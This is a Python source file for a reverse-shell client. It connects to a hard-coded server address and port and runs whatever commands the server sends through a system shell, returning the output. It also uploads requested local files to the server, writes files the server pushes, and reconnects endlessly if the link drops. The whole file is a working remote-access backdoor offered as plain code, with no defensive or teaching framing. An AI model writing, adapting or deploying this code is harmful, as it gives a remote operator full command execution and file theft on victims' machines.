import os
import socket
import subprocess
import time
import signal
import sys

class Client(object):

    def __init__(self):
        self.serverHost = '127.0.0.1'
        self.serverPort = 9898
        self.socket = None

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
        sys.exit(0)
        return

    def create(self):
        try:
            self.socket = socket.socket()
        except socket.error as e:
            print("Socket creation error" + str(e))
        return

    def connect(self):
        try:
            self.socket.connect((self.serverHost, self.serverPort))
        except socket.error as e:
            print("Socket connection error: " + str(e))
            raise
        return

    def print_output(self, output_str):
        sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
        # this will append the cwd alog with the command output.
        self.socket.send(sent_message)
        print(sent_message.decode('utf-8'))
        return

    def send_file(self, data_str):
        output_str = ""
        try:
            time.sleep(0.1)
            file_path = data_str[data_str.find('getfile')+len('getfile')+1:]
            with open(file_path, "rb") as f:
                file_data = f.read()
            self.socket.sendall(file_data)
            time.sleep(0.5)
            self.socket.send(str.encode("DONE UPLOADING"))
        except Exception as ex:
            output_str = f"Unable to upload the file: {ex}\n"
        return output_str

    
    def recv_file(self, data_str):
        output_str = ""
        filepath = data_str[data_str.find('sendfile')+len('sendfile')+1:]
        local_file_name = filepath.split(os.path.sep)[-1]
        try:
            with open(local_file_name, 'wb') as f: 
                while True:
                    data = self.socket.recv(20480)
                    try:
                        decoded_data = data.decode('UTF-8')
                    except Exception as ex:
                        decoded_data = "didnot decode"
                    if decoded_data == "DONE UPLOADING": break
                    f.write(data)
                    print("DOWNLOADING...............\n")                    
            print(f"File downloaded sucessful with name:{local_file_name}\n")
        except Exception as ex:
            output_str = f"Unable to download the file: {ex}\n"
        return output_str    
        
    def changedir(self, data_str):
        output_str = ""
        dir = data_str.split()[1].strip()
        try:
            os.chdir(dir)
        except Exception as ex:
            output_str = f"Could not change directory: {ex}\n"
        return output_str
    
    def execute_command(self, data):
        try:
            terminal = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = terminal.stdout.read() + terminal.stderr.read()
            output_str = output_bytes.decode("utf-8", errors="replace")
        except Exception as ex:
            output_str = f"Execution of command Failed: {str(ex)}\n" 
        return output_str
    
    def receive_commands(self):
        #checking if connection is active and working.
        try:
            self.socket.recv(10)
        except Exception as ex:
            print('Communication error: %s\n' %str(ex))
            return
        cwd = str.encode(str(os.getcwd()) + '> ')
        self.socket.send(cwd)
        while True:
            data = self.socket.recv(20480)
            data_str = data.decode('utf-8')
            split_data = data_str.split()
            print("command= ", data_str)
            if data == b'' or data_str == 'quit': break 
            # recv will return "" when server closes connection.
            elif len(split_data)>0 and data_str.split()[0] == 'cd':
                output_str = self.changedir(data_str)
            elif len(split_data)>0 and data_str.split()[0] == "getfile":
                output_str = self.send_file(data_str)
            elif len(split_data)>0 and data_str.split()[0] == "sendfile":
                output_str = self.recv_file(data_str)
            elif len(data_str) > 0:
                output_str = self.execute_command(data)
            try:
                self.print_output(output_str)
            except Exception as ex:
                print(f'Error in sending output: {str(ex)}')
        self.socket.close()
        return


def main():
    client = Client()
    client.register_signal_handler()
    client.create()
    while True:
        try:
            client.connect()
        except Exception as e:
            print("Error on socket connections: %s" %str(e))
            time.sleep(5)     
        else:
            break    
    try:
        client.receive_commands()
    except Exception as e:
        print('Error in recieving commands: ' + str(e))
    client.socket.close()
    return


if __name__ == '__main__':
    while True:
        main()
